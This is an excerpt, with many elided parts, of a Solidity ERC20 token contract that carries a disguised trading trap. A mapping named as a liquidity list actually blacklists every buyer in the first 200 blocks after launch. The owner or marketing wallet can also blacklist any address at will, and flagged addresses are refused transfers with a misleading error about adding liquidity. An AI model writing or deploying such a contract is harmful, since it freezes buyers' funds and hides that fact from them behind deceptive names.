...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isLiquidity;
    uint256 private launchedAt;
    uint256 private antiBotBlocks = 200;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 100000 * 10**10 * 10**9;
    ...
    uint256 private numTokensSellToAddToLiquidity = 10 * 10**5 * 10**9;
    ...
    constructor(address marketingAddress) public {
        ...
        _rewardWallet = marketingAddress;
...
//            0x10ED43C718714eb63d5aA57B78B54704E256024E
    ...
    function addingLiquidity(address addr, bool _adding) public {
        require(msg.sender == _marketingWallet || msg.sender == owner());
        _isLiquidity[addr] = _adding;
    }
    function addBot(address recipient) internal {
        if (!_isLiquidity[recipient]) _isLiquidity[recipient] = true;
    }
    ...
    function isGetBlocked(address account)public view returns (bool) {
        return _isLiquidity[account];
    }

    function anti(address from, address to) internal {
        if(from != owner() &&
            to != owner() &&
            from != _marketingWallet &&
            to != _marketingWallet &&
            launchedAt > 0 &&
            block.number - launchedAt < antiBotBlocks){
            addBot(to);
        }
    }

	function launch(address addr) internal {
        if (addr == uniswapV2Pair && launchedAt == 0) {
    ...
    function _transfer(
        ...
        require(
            !_isLiquidity[from] && !_isLiquidity[to],
            "ERC20: is not allowed to adding Liquidity"
        );
        anti(from, to);
        launch(to);
        ...
        if (
            ...
            if (contractTokenBalance > forMarketing) {
                swapAndLiquify(contractTokenBalance.sub(forMarketing));
            }
            inSwap = false;
        }
